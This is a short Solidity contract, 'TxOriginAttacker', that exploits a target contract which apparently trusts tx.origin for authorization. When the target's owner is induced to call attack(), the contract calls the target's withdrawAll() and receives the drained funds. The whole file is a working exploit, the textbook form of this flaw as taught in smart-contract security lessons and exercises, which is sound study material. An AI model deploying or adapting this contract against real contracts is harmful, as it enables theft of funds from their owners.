// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function withdrawAll() external;
}

contract TxOriginAttacker {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external {
        // when owner calls this contract,
        // tx.origin is still the owner
        target.withdrawAll();
    }

    receive() external payable {}
}
